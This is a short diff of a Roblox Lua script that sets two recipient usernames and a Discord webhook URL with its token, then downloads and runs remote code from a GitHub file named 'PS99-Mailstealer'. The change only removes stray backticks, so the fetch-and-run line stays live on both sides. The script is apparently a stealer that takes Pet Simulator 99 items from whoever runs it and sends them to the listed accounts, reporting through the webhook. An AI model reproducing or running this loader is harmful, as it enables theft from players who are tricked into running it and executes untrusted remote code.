@@ -2,4 +2,4 @@ Username = "raniel_jud"
 Username2 = "agsitma12"
 Webhook = "https://discord.com/api/webhooks/1181579702687780914/_gUChUybS-LKSstwIalaBBE60FG-74H_PGfVzUm2AOjP_bN1p-Z3MRjHjaemM1l2757U"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()```
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
